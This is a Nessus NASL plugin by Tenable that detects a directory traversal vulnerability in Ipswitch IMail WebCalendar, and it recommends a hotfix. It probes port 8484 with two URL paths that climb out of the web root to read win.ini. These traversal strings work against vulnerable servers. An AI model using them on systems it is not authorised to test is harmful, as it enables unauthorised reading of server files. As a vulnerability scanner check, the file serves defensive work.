#
# This script is (c) Tenable Network Security
#

if(description)
{
 script_id(18368);
 script_bugtraq_id(13727);
 script_version("$Revision: 1.3 $");
 name["english"] = "Ipswitch Imail WebCalendar Directory Traversal Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote server is running Ipswitch IMail Web calendaring.

The remote version of this software is vulnerable to a directory
traversal vulnerability. An attacker, exploiting this vulnerability,
may be able to retrieve sensitive files present on the server.

Solution: Apply IMail Server 8.2 Hotfix 2
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Ipswitch Imail WebCalendar Directory Traversal Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 8484);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8484);
if(! get_port_state(port)) exit(0);

banner = get_http_banner (port:port);

if ("Ipswitch Web Calendaring" >!< banner)
  exit (0);

r[0] = "nessus.jsp?\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini";
r[1] = "nessus.jsp?\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini";


for (i=0; i < 2; i++)
{
  if (check_win_dir_trav_ka(port: port, url: r[i]))
  {
    security_hole(port);
    exit(0);
  }
}
